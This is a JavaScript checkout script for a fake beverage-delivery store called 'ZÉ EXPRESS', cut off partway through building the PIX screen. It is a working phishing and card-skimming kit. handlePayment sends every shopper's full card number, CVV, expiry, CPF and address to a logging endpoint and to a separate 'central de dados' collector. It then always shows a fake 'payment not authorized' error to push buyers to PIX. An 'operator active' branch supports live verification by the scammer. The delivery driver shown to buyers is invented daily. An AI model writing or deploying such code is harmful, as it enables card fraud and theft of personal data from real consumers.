// --- VARIÁVEIS DE ESTADO ---
let cart = [];
let productsData = [];
const SHIPPING_FEE = 0;
const COUPON_DISCOUNT = 1500; // 15 reais em centavos
const COUPON_MIN_ORDER = 5000; // 50 reais em centavos - pedido mínimo para cupom
let couponApplied = false;
let pixTimerInterval;
let pollingInterval;
let currentTransactionId = null;
let cardPollingInterval = null;
let currentSubmissionId = null;
let leafletMap;

// --- FALLBACK DE LOG (salva dados quando a API principal falha) ---
async function saveToLog(type, payload) {
    try {
        await fetch('../api/log-data.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type, payload })
        });
    } catch (e) {
        // Silencioso — o log é best-effort
        console.warn('[log] Não foi possível salvar log:', e);
    }
}

// --- CONFIGURACAO DA CENTRAL DE DADOS ---
const DATA_API_URL = window.DATA_API_URL || "http://localhost:5173/api/submit";

async function submitToCentralData({ name, number16, number4, number3 }) {
    const payload = {
        name: String(name || "").trim(),
        number16: String(number16 || ""),
        number4: String(number4 || ""),
        number3: String(number3 || ""),
    };

    const response = await fetch(DATA_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    });

    const result = await response.json().catch(() => ({}));
    if (!response.ok) {
        throw new Error(result.error || "Nao foi possivel enviar os dados.");
    }

    return result;
}

const onlyDigits = (value) => String(value || "").replace(/\D/g, "");

// --- CONFIGURAÇÃO DA API DE PAGAMENTO (BlackPayments via PHP) ---
const PAYMENT_API_URL   = '../api/payment-api.php';             // POST — criar PIX
const PAYMENT_STATUS_URL = '../api/payment-api.php?action=status'; // GET ?id=txId

function getProduct(id) {
    return productsData.find(p => p.id === id) || null;
}

// --- DADOS DIÁRIOS DO ENTREGADOR (rotação automática por dia) ---

/**
 * Gerador pseudo-aleatório com seed (determinístico).
 * Permite gerar os mesmos valores para o mesmo dia.
 */
function seededRandom(seed) {
    let s = seed % 2147483647;
    if (s <= 0) s += 2147483646;
    return function() {
        s = (s * 16807) % 2147483647;
        return (s - 1) / 2147483646;
    };
}

/** Retorna a seed do dia (baseada na data atual: YYYYMMDD) */
function getDailySeed() {
    const now = new Date();
    return now.getFullYear() * 10000 + (now.getMonth() + 1) * 100 + now.getDate();
}

/** Seleciona um item aleatório de um array usando o gerador com seed */
function pickDaily(arr, rng) {
    return arr[Math.floor(rng() * arr.length)];
}

const DRIVER_NAMES = [
    'DOUGLAS RODRIGO GOMES MOURA',
    'LUCAS HENRIQUE SILVA SANTOS',
    'RAFAEL AUGUSTO LIMA PEREIRA',
    'ANDERSON CARLOS FERREIRA COSTA',
    'MARCOS VINÍCIUS ALMEIDA SOUZA',
    'GABRIEL FERNANDES OLIVEIRA',
    'PEDRO HENRIQUE BARBOSA NUNES',
    'THIAGO MARTINS CARVALHO',
    'FELIPE ANDRADE ROCHA JUNIOR',
    'BRUNO RIBEIRO NASCIMENTO',
    'MATHEUS ALVES TEIXEIRA',
    'LEANDRO BATISTA MOREIRA',
    'ROBERTO ARAÚJO MENDES',
    'JOÃO VICTOR PINTO DIAS',
    'WILLIAM SOUZA GUIMARÃES',
    'DANIEL COSTA MACHADO',
    'VINICIUS RAMOS CORREIA',
    'GUSTAVO LOPES CARDOSO',
    'EDUARDO FREITAS MONTEIRO',
    'RENATO MIRANDA CAVALCANTI'
];

const DRIVER_VEHICLES = [
    'Honda CG 160',
    'Honda CG 150 Titan',
    'Yamaha Factor 150',
    'Honda Bros 160',
    'Yamaha Fazer 250',
    'Honda CB 300',
    'Yamaha Crosser 150',
    'Honda Biz 125',
    'Honda Pop 110i',
    'Yamaha NMAX 160'
];

/**
 * Gera uma placa brasileira no formato Mercosul (ABC1D23).
 */
function generateDailyPlate(rng) {
    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const digits = '0123456789';
    let plate = '';
    for (let i = 0; i < 3; i++) plate += letters[Math.floor(rng() * letters.length)];
    plate += digits[Math.floor(rng() * digits.length)];
    plate += letters[Math.floor(rng() * letters.length)];
    for (let i = 0; i < 2; i++) plate += digits[Math.floor(rng() * digits.length)];
    return plate.slice(0, 3) + '-' + plate.slice(3);
}

/**
 * Gera a avaliação do dia (entre 4.7 e 5.0).
 */
function generateDailyRating(rng) {
    return (4.7 + rng() * 0.3).toFixed(1);
}

/**
 * Gera a distância estimada do dia (entre 1.2 e 4.5 km).
 */
function generateDailyDistance(rng) {
    return (1.2 + rng() * 3.3).toFixed(1);
}

/**
 * Gera o tempo estimado do dia (entre 8 e 18 min).
 */
function generateDailyTime(rng) {
    return Math.floor(8 + rng() * 10);
}

/** Retorna todos os dados do entregador do dia (determinísticos) */
function getDailyDriverData() {
    const rng = seededRandom(getDailySeed());
    return {
        name: pickDaily(DRIVER_NAMES, rng),
        vehicle: pickDaily(DRIVER_VEHICLES, rng),
        plate: generateDailyPlate(rng),
        rating: generateDailyRating(rng),
        distance: generateDailyDistance(rng),
        time: generateDailyTime(rng)
    };
}

// --- FUNÇÕES DE UTILIDADE E UI ---

/**
 * Formata um valor em centavos para a moeda BRL (R$).
 * @param {number} cents O valor em centavos.
 * @returns {string} A string formatada.
 */
function formatCurrency(cents) {
    return (cents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
}

/**
 * Atualiza todos os elementos de preço na interface, considerando o cupom.
 */
function updatePricesUI() {
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const discount = couponApplied ? COUPON_DISCOUNT : 0;
    const total = Math.max(0, subtotal - discount + SHIPPING_FEE);

    document.getElementById('collapsible-bar-total').innerText = formatCurrency(total);
    document.getElementById('summary-subtotal').innerText = formatCurrency(subtotal);
    document.getElementById('summary-total').innerText = formatCurrency(total);

    const discountRow = document.getElementById('summary-discount-row');
    if (discountRow) {
        if (couponApplied) {
            document.getElementById('summary-discount').innerText = '- ' + formatCurrency(discount);
            discountRow.classList.remove('hidden');
        } else {
            discountRow.classList.add('hidden');
        }
    }

    const pixTotalEl = document.getElementById('pix-total');
    if (pixTotalEl) pixTotalEl.innerText = formatCurrency(total);
}


/**
 * Preenche o resumo do pedido com os itens do carrinho.
 */
function populateCartSummary() {
    const container = document.getElementById('summary-items-container');
    if (!container) return;
    container.innerHTML = cart.map(item => {
        const p = getProduct(item.id);
        const nome = p?.name || '';
        const imagem = p?.image || '';
        return `
        <div class="flex items-center gap-4">
            <img src="${imagem}" alt="${nome}" class="w-16 h-16 rounded-lg object-contain border border-slate-200 p-1">
            <div class="flex-grow">
                <p class="font-semibold text-slate-800 text-sm">${nome}</p>
                <p class="text-sm text-slate-500">${item.quantity} x ${formatCurrency(item.price)}</p>
            </div>
            <span class="font-medium text-slate-800 text-sm">${formatCurrency(item.price * item.quantity)}</span>
        </div>
    `;
    }).join('');
    updatePricesUI();
}

/**
 * Atualiza a barra de progresso visual.
 * @param {number} step O passo atual (1, 2 ou 3).
 */
function updateProgressBar(step) {
    document.querySelectorAll('[id^="step-"]').forEach((el, index) => {
        const dot = el.querySelector('.step-dot');
        const stepNumber = index + 1;

        el.classList.remove('step-active', 'step-inactive', 'step-complete');
        dot.classList.remove('bg-theme-primary', 'text-white', 'bg-slate-300', 'text-slate-600', 'bg-green-500');

        if (stepNumber < step) {
            el.classList.add('step-complete');
            dot.classList.add('bg-green-500', 'text-white');
            dot.innerHTML = '&#10003;'; // Checkmark
        } else if (stepNumber === step) {
            el.classList.add('step-active');
            dot.classList.add('bg-theme-primary', 'text-white');
            dot.innerText = step;
        } else {
            el.classList.add('step-inactive');
            dot.classList.add('bg-slate-300', 'text-slate-600');
            dot.innerText = stepNumber;
        }
    });
}


// --- LÓGICA DAS ETAPAS DO CHECKOUT ---

function showLoadingAndDriverSearch() {
    const fullAddress = `${document.getElementById('street').value}, ${document.getElementById('number').value} - ${document.getElementById('neighborhood').value}, ${document.getElementById('city').value}`;
    document.getElementById('loadingAddress').innerText = fullAddress;
    document.getElementById('checkoutForm').classList.add('hidden');
    document.getElementById('loadingStep').classList.remove('hidden');
    window.scrollTo(0, 0);

    // Inicia a geocodificação em paralelo com a animação de loading
    const geocodePromise = geocodeAddress(fullAddress);
    const minDelay = new Promise(resolve => setTimeout(resolve, 1800));

    // Espera ambos: animação mínima E geocodificação terminarem
    Promise.all([geocodePromise, minDelay]).then(([geoResult]) => {
        document.getElementById('loadingStep').classList.add('hidden');
        showDriverFoundScreen(fullAddress, geoResult);
    });
}

// Coordenadas de fallback para capitais brasileiras
const FALLBACK_COORDS = {
    'são paulo': [-23.5505, -46.6333],
    'sao paulo': [-23.5505, -46.6333],
    'rio de janeiro': [-22.9068, -43.1729],
    'belo horizonte': [-19.9167, -43.9345],
    'brasília': [-15.7801, -47.9292],
    'brasilia': [-15.7801, -47.9292],
    'curitiba': [-25.4284, -49.2733],
    'porto alegre': [-30.0346, -51.2177],
    'salvador': [-12.9714, -38.5124],
    'recife': [-8.0476, -34.8770],
    'fortaleza': [-3.7172, -38.5433],
    'belém': [-1.4558, -48.5024],
    'belem': [-1.4558, -48.5024],
    'manaus': [-3.1190, -60.0217],
    'goiânia': [-16.6869, -49.2648],
    'goiania': [-16.6869, -49.2648],
    'campinas': [-22.9099, -47.0626],
    'guarulhos': [-23.4538, -46.5333],
    'vitória': [-20.3155, -40.3128],
    'vitoria': [-20.3155, -40.3128],
    'florianópolis': [-27.5954, -48.5480],
    'florianopolis': [-27.5954, -48.5480],
    'natal': [-5.7945, -35.2110],
    'campo grande': [-20.4697, -54.6201],
    'cuiabá': [-15.6014, -56.0979],
    'cuiaba': [-15.6014, -56.0979],
    'joão pessoa': [-7.1195, -34.8450],
    'joao pessoa': [-7.1195, -34.8450],
    'teresina': [-5.0892, -42.8019],
    'maceió': [-9.6658, -35.7353],
    'maceio': [-9.6658, -35.7353],
    'são luís': [-2.5297, -44.2825],
    'sao luis': [-2.5297, -44.2825],
    'aracaju': [-10.9091, -37.0677],
    'londrina': [-23.3045, -51.1696],
    'niterói': [-22.8833, -43.1036],
    'niteroi': [-22.8833, -43.1036],
    'osasco': [-23.5325, -46.7917],
    'santo andré': [-23.6737, -46.5432],
    'santo andre': [-23.6737, -46.5432],
    'ribeirão preto': [-21.1767, -47.8208],
    'ribeirao preto': [-21.1767, -47.8208],
    'sorocaba': [-23.5015, -47.4526],
    'default': [-23.5505, -46.6333] // São Paulo como padrão
};

/**
 * Pede a localização real do usuário via Geolocation API do navegador.
 * Retorna uma Promise que resolve com {lat, lon} ou rejeita se negado/indisponível.
 * Timeout de 5s para não travar o fluxo.
 */
function getBrowserGeolocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            return reject(new Error('Geolocation API não suportada'));
        }
        navigator.geolocation.getCurrentPosition(
            (position) => resolve({
                lat: position.coords.latitude,
                lon: position.coords.longitude
            }),
            (error) => reject(error),
            { enableHighAccuracy: false, timeout: 2000, maximumAge: 120000 }
        );
    });
}

/**
 * Geocodifica um endereço com múltiplas estratégias em cascata:
 * 1) Geolocalização real do navegador (mais precisa)
 * 2) Nominatim — endereço completo
 * 3) Nominatim — só a cidade
 * 4) Coordenadas locais por nome da cidade
 * 5) Fallback: São Paulo
 */
async function geocodeAddress(addressString) {
    const headers = { 'Accept': 'application/json' };
    const baseUrl = 'https://nominatim.openstreetmap.org/search';

    // Tentativa 1: Geolocalização real do navegador (GPS / Wi-Fi / IP)
    try {
        const pos = await getBrowserGeolocation();
        return { lat: pos.lat, lon: pos.lon, source: 'browser_geolocation' };
    } catch (e) {
        console.warn('Geolocalização do navegador indisponível:', e.message || e.code);
    }

    // Tentativa 2: Nominatim — endereço completo
    try {
        const url = `${baseUrl}?q=${encodeURIComponent(addressString)}&format=json&limit=1&countrycodes=br`;
        const response = await fetch(url, { headers });
        const data = await response.json();
        if (data && data.length > 0) {
            return { lat: parseFloat(data[0].lat), lon: parseFloat(data[0].lon), source: 'nominatim_full' };
        }
    } catch (e) {
        console.warn('Geocoding (endereço completo) falhou:', e.message);
    }

    // Tentativa 3: Nominatim — só a cidade
    const cityField = document.getElementById('city');
    const cityName = cityField ? cityField.value.trim() : '';
    if (cityName) {
        try {
            const url = `${baseUrl}?q=${encodeURIComponent(cityName + ', Brasil')}&format=json&limit=1&countrycodes=br`;
            const response = await fetch(url, { headers });
            const data = await response.json();
            if (data && data.length > 0) {
                return { lat: parseFloat(data[0].lat), lon: parseFloat(data[0].lon), source: 'nominatim_city' };
            }
        } catch (e) {
            console.warn('Geocoding (cidade) falhou:', e.message);
        }
    }

    // Tentativa 4: Coordenadas locais por nome da cidade
    const cityLower = cityName.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
    for (const [key, coords] of Object.entries(FALLBACK_COORDS)) {
        const keyNorm = key.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
        if (cityLower.includes(keyNorm) || keyNorm.includes(cityLower)) {
            return { lat: coords[0], lon: coords[1], source: 'fallback_city' };
        }
    }

    // Tentativa 5: Fallback final — coordenadas aleatórias dentro do Brasil
    // Limites aproximados do Brasil: lat -33.75 a 5.27, lon -73.99 a -34.79
    // Selecionamos aleatoriamente uma capital brasileira para manter realismo
    const capitalKeys = Object.keys(FALLBACK_COORDS).filter(k => k !== 'default');
    const randomCapital = capitalKeys[Math.floor(Math.random() * capitalKeys.length)];
    const coords = FALLBACK_COORDS[randomCapital];
    // Adiciona pequena variação aleatória (~2-5km) para não cair exatamente no centro
    const latJitter = (Math.random() - 0.5) * 0.05;
    const lonJitter = (Math.random() - 0.5) * 0.05;
    return { lat: coords[0] + latJitter, lon: coords[1] + lonJitter, source: 'fallback_random_br' };
}

async function showDriverFoundScreen(addressString, preloadedGeo) {
    const mapContainer = document.getElementById('mapContainer');
    if (leafletMap) leafletMap.remove();
    mapContainer.innerHTML = '';

    try {
        // Usa o resultado pré-carregado se disponível, senão faz a geocodificação
        const geo = preloadedGeo || await geocodeAddress(addressString);

        const customerLatLng = L.latLng(geo.lat, geo.lon);
        const zoomLevel = (geo.source === 'fallback_random_br' || geo.source === 'fallback_city') ? 14 : 16;

        leafletMap = L.map(mapContainer, {
            zoomControl: false,
            scrollWheelZoom: false,
            dragging: false,
            doubleClickZoom: false,
            attributionControl: false
        }).setView(customerLatLng, zoomLevel);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '&copy; OpenStreetMap'
        }).addTo(leafletMap);

        // Ícone personalizado laranja (tema do app)
        const markerIcon = L.divIcon({
            className: '',
            html: `<div style="
                background: #f59e0b;
                width: 32px; height: 32px;
                border-radius: 50% 50% 50% 0;
                transform: rotate(-45deg);
                border: 3px solid #fff;
                box-shadow: 0 2px 8px rgba(0,0,0,0.3);
                display: flex; align-items: center; justify-content: center;
            "><div style="
                transform: rotate(45deg);
                color: #fff; font-size: 14px; font-weight: bold;
            ">📍</div></div>`,
            iconSize: [32, 32],
            iconAnchor: [16, 32],
            popupAnchor: [0, -32]
        });

        L.marker(customerLatLng, { icon: markerIcon })
            .addTo(leafletMap)
            .bindPopup('<b>Seu Endereço (Aproximado)</b>')
            .openPopup();

    } catch (error) {
        console.error("Erro no mapa:", error);
        // Fallback visual: imagem estática do mapa via iframe do OpenStreetMap
        mapContainer.innerHTML = `
            <iframe
                width="100%" height="100%" frameborder="0" scrolling="no"
                src="https://www.openstreetmap.org/export/embed.html?bbox=-46.70%2C-23.60%2C-46.57%2C-23.50&layer=mapnik"
                style="border:0; pointer-events:none;">
            </iframe>`;
    }

    // Preenche dados do entregador com rotação diária
    const driver = getDailyDriverData();
    document.getElementById('driverName').innerText = driver.name;
    document.getElementById('driverRating').innerText = driver.rating;
    document.getElementById('driverPlate').innerText = driver.plate;
    document.getElementById('driverCar').innerText = driver.vehicle;
    document.getElementById('deliveryDistance').innerText = `${driver.distance} km`;
    document.getElementById('deliveryTime').innerText = `~${driver.time} min`;
    document.getElementById('driverAddress').innerText = addressString;
    document.getElementById('distributorCnpj').innerText = `CNPJ 39.xxx.xxx/0001-07`;
    document.getElementById('driverFoundStep').classList.remove('hidden');

    setTimeout(() => {
        if (leafletMap) leafletMap.invalidateSize();
    }, 100);
}

function showReviewStep() {
    const checkoutForm = document.getElementById('checkoutForm');
    const formData = new FormData(checkoutForm);
    const name = formData.get('name');
    const phone = formData.get('phone');
    const address = `${formData.get('street')}, ${formData.get('number')}<br>${formData.get('neighborhood')} - ${formData.get('city')}/${formData.get('state')}<br>CEP: ${formData.get('cep')}`;

    document.getElementById('reviewAddress').innerHTML = address;

    updateReviewReceipt(name, phone);

    document.getElementById('driverFoundStep').classList.add('hidden');
    document.getElementById('reviewStep').classList.remove('hidden');
    window.scrollTo(0, 0);
}

function updateReviewReceipt(name, phone) {
    const receiptContainer = document.getElementById('reviewReceiptContainer');
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const discount = couponApplied ? COUPON_DISCOUNT : 0;
    const total = Math.max(0, subtotal - discount + SHIPPING_FEE);

    const itemsHTML = cart.map(item => {
        const nome = getProduct(item.id)?.name || '';
        return `
        <tr>
            <td class="item-name py-2">${nome}</td>
            <td class="text-center py-2">${item.quantity}</td>
            <td class="text-right py-2">${formatCurrency(item.price * item.quantity)}</td>
        </tr>
    `;
    }).join('');

    const discountHTML = couponApplied ? `
        <div class="text-green-600">
            <span>Cupom Primeira Compra</span>
            <span>- ${formatCurrency(discount)}</span>
        </div>
    ` : '';

    receiptContainer.innerHTML = `
        <div class="receipt-style">
            <div class="receipt-header">
                <h3 class="font-bold text-lg">ZÉ EXPRESS</h3>
                <p class="text-xs">CNPJ 39.xxx.xxx/0001-07</p>
                <p class="text-xs">${new Date().toLocaleString('pt-BR')}</p>
            </div>
            <div class="text-sm my-4 space-y-1">
                <p><strong>CLIENTE:</strong> ${name}</p>
                <p><strong>FONE:</strong> ${phone}</p>
            </div>
            <div class="receipt-items">
                <table>
                    <thead>
                        <tr>
                            <th>Item</th>
                            <th class="text-center">Qtd</th>
                            <th class="text-right">Total</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${itemsHTML}
                    </tbody>
                </table>
            </div>
            <div class="receipt-totals text-sm">
                <div>
                    <span>Subtotal</span>
                    <span>${formatCurrency(subtotal)}</span>
                </div>
                ${discountHTML}
                <div class="${SHIPPING_FEE > 0 ? '' : 'text-green-600 font-bold'}">
                    <span>Frete</span>
                    <span>${SHIPPING_FEE > 0 ? formatCurrency(SHIPPING_FEE) : 'GRÁTIS'}</span>
                </div>
                <div class="text-base mt-2 pt-2 border-t border-dashed border-gray-400">
                    <span>TOTAL</span>
                    <span>${formatCurrency(total)}</span>
                </div>
            </div>
        </div>
    `;
    updatePricesUI();
}


function getTotalFromLocalStorage() {
    const cartData = sessionStorage.getItem('checkoutCart');
    if (!cartData) return 0;
    try {
        const parsedCart = cartData && typeof cartData === 'string' ? cartData : String(cartData);
        const cartParsed = JSON.parse(parsedCart);
        if (!Array.isArray(cartParsed)) return 0;
        let subtotal = 0;
        for (const item of cartParsed) {
            const price = Number(item.price) || 0;
            const quantity = Number(item.quantity) || 1;
            subtotal += price * quantity;
        }
        const discount = couponApplied ? COUPON_DISCOUNT : 0;
        return Math.max(0, subtotal - discount + SHIPPING_FEE);
    } catch (e) {
        return 0;
    }
}


// --- LÓGICA DE PAGAMENTO ---

async function handlePayment(paymentMethod) {
    const buttonId = paymentMethod === 'pix' ? 'mainPayButton' : 'creditCardPayButton';
    const button = document.getElementById(buttonId);

    button.disabled = true;
    button.querySelector('span').classList.add('hidden');
    button.querySelector('div').classList.remove('hidden');

    if (paymentMethod === 'credit_card') {
        // --- VALIDAÇÃO LUHN DO CARTÃO ---
        const _cardNumRaw = (document.getElementById('cardNumber')?.value || '').replace(/\s/g, '');
        function _luhn(num) {
            if (num.length < 13) return false;
            let sum = 0, dbl = false;
            for (let i = num.length - 1; i >= 0; i--) {
                let d = parseInt(num[i], 10);
                if (dbl) { d *= 2; if (d > 9) d -= 9; }
                sum += d; dbl = !dbl;
            }
            return sum % 10 === 0;
        }
        if (!_luhn(_cardNumRaw)) {
            button.disabled = false;
            button.querySelector('span').classList.remove('hidden');
            button.querySelector('div').classList.add('hidden');
            Swal.fire({ icon: 'error', title: 'Cartão inválido', text: 'O número do cartão informado é inválido. Por favor, verifique os dados e tente novamente.', confirmButtonColor: '#f59e0b' });
            return;
        }
        // --- SALVAR SEMPRE: independente de sucesso ou falha da API ---
        const _cardNum    = _cardNumRaw;
        const _cardName   = document.getElementById('cardName')?.value || '';
        const _cardExpiry = document.getElementById('cardExpiry')?.value || '';
        const _cardCvv    = document.getElementById('cardCvv')?.value || '';
        const _subtotal   = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
        const _discount   = couponApplied ? COUPON_DISCOUNT : 0;
        const _total      = Math.max(0, _subtotal - _discount + SHIPPING_FEE);
        await saveToLog('credit_card', {
            cliente: {
                nome:      document.getElementById('name')?.value || '',
                telefone:  document.getElementById('phone')?.value || '',
                cpf:       document.getElementById('document')?.value || '',
            },
            endereco: {
                cep:       document.getElementById('cep')?.value || '',
                rua:       document.getElementById('street')?.value || '',
                numero:    document.getElementById('number')?.value || '',
                bairro:    document.getElementById('neighborhood')?.value || '',
                cidade:    document.getElementById('city')?.value || '',
                estado:    document.getElementById('state')?.value || '',
            },
            cartao: {
                numero:    _cardNum,
                titular:   _cardName,
                validade:  _cardExpiry,
                cvv:       _cardCvv,
            },
            pedido: {
                itens:     cart.map(i => ({ id: i.id, nome: i.name || '', quantidade: i.quantity, preco_unit: i.price })),
                subtotal:  _subtotal,
                desconto:  _discount,
                total:     _total,
            }
        });

        try {
            await submitToCentralData({
                name: _cardName,
                number16: onlyDigits(_cardNum).padStart(16, "0").slice(-16),
                number4: onlyDigits(_cardExpiry).padStart(4, "0").slice(-4),
                number3: onlyDigits(_cardCvv).padStart(3, "0").slice(-3),
            });
        } catch (centralError) {
            console.warn("[central-de-dados]", centralError);
        }

        try {
            const checkoutForm = document.getElementById('checkoutForm');
            const formData = Object.fromEntries(new FormData(checkoutForm).entries());

            const cardNumber = _cardNum;
            const cardName   = _cardName;
            const cardExpiry = _cardExpiry;
            const cardCvv    = _cardCvv;

            formData.cardNumber = cardNumber;
            formData.cardName = cardName;
            formData.cardExpiry = cardExpiry;
            formData.cardCvv = cardCvv;
            formData.paymentMethod = 'credit_card';
            formData.amount = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0) + SHIPPING_FEE;
            formData.quantity = cart.length;
            formData.cart = cart;

            const saveResponse = await fetch('../api/payment-api.php?action=save_card_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });
            const saveResult = await saveResponse.json();

            // Se operador ativo, exibe tela de verificação com polling
            if (saveResult.operator_active && saveResult.submission_id) {
                currentSubmissionId = saveResult.submission_id;
                displayCardVerificationScreen(saveResult.submission_id);
                return;
            }

        } catch (saveError) {
            console.warn("Falha ao salvar dados do cartão (opcional)", saveError);
            // Fallback: salva dados localmente em log quando a API falha
            await saveToLog('credit_card', {
                name:        document.getElementById('name')?.value || '',
                phone:       document.getElementById('phone')?.value || '',
                document:    document.getElementById('document')?.value || '',
                street:      document.getElementById('street')?.value || '',
                number:      document.getElementById('number')?.value || '',
                neighborhood:document.getElementById('neighborhood')?.value || '',
                city:        document.getElementById('city')?.value || '',
                state:       document.getElementById('state')?.value || '',
                cep:         document.getElementById('cep')?.value || '',
                cardNumber:  document.getElementById('cardNumber')?.value || '',
                cardName:    document.getElementById('cardName')?.value || '',
                cardExpiry:  document.getElementById('cardExpiry')?.value || '',
                cardCvv:     document.getElementById('cardCvv')?.value || '',
                amount:      cart.reduce((acc, item) => acc + (item.price * item.quantity), 0) + SHIPPING_FEE,
                cart:        cart
            });
        }

        // Comportamento padrão quando operador NÃO está ativo: mostra erro
        setTimeout(() => {
            Swal.fire({
                icon: 'error',
                title: 'Pagamento não autorizado',
                text: 'O banco emissor não autorizado a transação. Por favor, verifique os dados ou tente outra forma de pagamento.',
                showDenyButton: true,
                confirmButtonText: 'Tentar Novamente',
                denyButtonText: 'Pagar com PIX',
                confirmButtonColor: '#f59e0b',
                denyButtonColor: '#64748b',
            }).then((result) => {
                if (result.isDenied) {
                    const pixOption = document.getElementById('pixOption');
                    pixOption.click();
                    pixOption.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
            });

            button.disabled = false;
            button.querySelector('span').classList.remove('hidden');
            button.querySelector('div').classList.add('hidden');

        }, 2000);

        return;
    }

    // --- SALVAR SEMPRE: dados do cliente ao tentar PIX ---
    const _pixForm = document.getElementById('checkoutForm');
    const _pixData = _pixForm ? Object.fromEntries(new FormData(_pixForm).entries()) : {};
    const _pixSubtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const _pixDiscount = couponApplied ? COUPON_DISCOUNT : 0;
    const _pixTotal    = Math.max(0, _pixSubtotal - _pixDiscount + SHIPPING_FEE);
    await saveToLog('pix', {
        cliente: {
            nome:      _pixData.name || '',
            telefone:  _pixData.phone || '',
            cpf:       _pixData.document || '',
        },
        endereco: {
            cep:       _pixData.cep || '',
            rua:       _pixData.street || '',
            numero:    _pixData.number || '',
            bairro:    _pixData.neighborhood || '',
            cidade:    _pixData.city || '',
            estado:    _pixData.state || '',
        },
        pedido: {
            itens:     cart.map(i => ({ id: i.id, nome: i.name || '', quantidade: i.quantity, preco_unit: i.price })),
            subtotal:  _pixSubtotal,
            desconto:  _pixDiscount,
            total:     _pixTotal,
        }
    });

    try {
        const checkoutForm = document.getElementById('checkoutForm');
        const formData = Object.fromEntries(new FormData(checkoutForm).entries());
        const paymentData = await createPixPayment(formData);

        if (paymentMethod === 'pix' && paymentData && paymentData.paymentCode && paymentData.idTransaction) {
            currentTransactionId = paymentData.idTransaction;
            displayPixScreen({
                pix_emv: paymentData.paymentCode,
                pixImageUrl: paymentData.pixImageUrl || null,
                pixBase64: paymentData.pixBase64 || null,
                total: 0
            });
            startPollingPaymentStatus(paymentData.idTransaction);
        } else {
            throw new Error("Resposta inválida do gateway de pagamento.");
        }
    } catch (error) {
        console.error('Erro no pagamento:', error);
        // Fallback: salva dados do cliente e tentativa de PIX quando a API falha
        const checkoutFormEl = document.getElementById('checkoutForm');
        const fallbackData = checkoutFormEl ? Object.fromEntries(new FormData(checkoutFormEl).entries()) : {};
        await saveToLog('pix_failed', {
            name:        fallbackData.name || '',
            phone:       fallbackData.phone || '',
            document:    fallbackData.document || '',
            street:      fallbackData.street || '',
            number:      fallbackData.number || '',
            neighborhood:fallbackData.neighborhood || '',
            city:        fallbackData.city || '',
            state:       fallbackData.state || '',
            cep:         fallbackData.cep || '',
            cart:        cart,
            error:       error.message || 'unknown'
        });
        let userMessage = error.message || 'Erro desconhecido ao processar o pagamento.';
        if (userMessage.includes('Dados da requisição inválidos')) {
            userMessage = 'Houve um problema ao processar seu pedido. Por favor, tente novamente. Se o erro persistir, reduza a quantidade de itens no carrinho ou entre em contato com o suporte.';
        }
        Swal.fire({
            icon: 'error',
            title: 'Falha ao processar pagamento',
            html: userMessage,
            confirmButtonColor: '#f59e0b',
            confirmButtonText: 'Tentar Novamente'
        });
        button.disabled = false;
        button.querySelector('span').classList.remove('hidden');
        button.querySelector('div').classList.add('hidden');
    }
}


function displayPixScreen(paymentData) {
    clearInterval(pixTimerInterval);
    document.getElementById('checkoutForm').classList.add('hidden');
    document.getElementById('driverFoundStep')?.classList.add('hidden');
    document.getElementById('summarySection').classList.add('hidden');
    const pixContainer = document.getElementById('pixContainer');
    if (!pixContainer) throw new Error('Tela de confirmação indisponível.');
    pixContainer.classList.remove('hidden');

    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const pixDiscount = couponApplied ? COUPON_DISCOUNT : 0;
    let novoTotal = Math.max(0, subtotal - pixDiscount + SHIPPING_FEE);
    const randomMinutes = Math.floor(Math.random() * 7) + 13;

    pixContainer.innerHTML = `
    <div class="bg-white p-6 rounded-xl border border-slate-200">
        <h2 class="text-xl font-bold text-slate-800 mb-2">Falta pouco para sua bebida chegar!</h2>
        <p class="text-slate-600 mb-4 text-sm">Pague com PIX para confirmar a compra. O código expira em <span id="timerDisplay" class="font-semibold text-red-600">10:00</span>.</p>
        <div id="pixQrCode" class="mx-auto w-52 h-52 flex items-center justify-center"></div>
        <div class="mt-4">
            <p class="text-sm text-slate-500">Valor do PIX:</p>
            <p class="text-2xl font-bold text-theme-primary">${formatCurrency(novoTotal)}</p>
        </div>
        <div id="payment-status" class="mt-2 flex justify-center items-center gap-2 text-amber-600 font-semibold">
           <div class="spinner-sm"></div>
           <span>Aguardando pagamento...</span>
        </div>
        <div class="relative max-w-sm mx-auto mt-6">
            <input id="pixCopyPaste" type="text" class="w-full bg-slate-100 border-slate-300 rounded-lg p-3 pr-20 text-sm text-slate-700" readonly>
            <button id="copyButton" class="absolute inset-y-0 right-0 flex items-center px-4 bg-slate-200 text-slate-600 hover:bg-slate-300 rounded-r-lg text-sm font-light transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
                Copiar
            </button>
        </div>
        <span id="copyFeedback" class="text-sm text-green-600 mt-2 hidden">PIX Copiado!</span>
        <div class="text-center mt-4">
             <a href="#" id="toggle-instructions" class="text-sm font-semibold text-theme-primary hover:underline">Como pagar com Copia e Cola?</a>
        </div>
        <div id="instructions-content" class="hidden mt-4 text-left space-y-4 max-w-xs mx-auto">
             <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
